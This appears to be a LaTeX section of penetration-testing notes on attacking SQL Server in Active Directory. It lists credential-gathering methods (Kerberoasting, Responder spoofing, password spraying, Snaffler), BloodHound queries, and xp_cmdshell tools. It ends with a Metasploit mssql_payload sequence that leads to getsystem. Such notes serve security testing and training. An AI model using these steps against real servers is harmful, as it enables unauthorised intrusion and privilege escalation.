
\section{SQL Server}

It is common to find user and service accounts set up with sysadmin privileges
on a given SQL server instance. Credentials for an account with this access can
be obtanin via Kerberoasting~\ref{kerberos:kerberoasting} or others such as
LLMNR/NBT-NS Response Spoofing~\ref{tool:reponder} or password spraying.
Another way is using the tool Snaffler~\ref{tool:snaffler} to find
\verb+web.config+ or other types of configuration files that contain SQL server
connection strings.

BloodHound :
\begin{itemize}
        \item SQLAdmin edge.
        \item SQL Admin Rights in the Node Info tab
        \item a custom Cypher query to search
\end{itemize}


tools to exploit:
\begin{itemize}
    \item powerUpSQL~\ref{tool:powerupsql}
    \item mssqlclient.py~\ref{tool:impacket:mssqlclient} which allow {\bf
        \verb+xp_cmdshell+} exploit
\end{itemize}

\begin{verbatim}
msfconsole

setg PASSWORD
setg RHOSTS
setg USERNAME
use windows/mssql/mssql_payload
setg RPORT
set SRVPORT match payload port
exploit
getsystem
\end{verbatim}
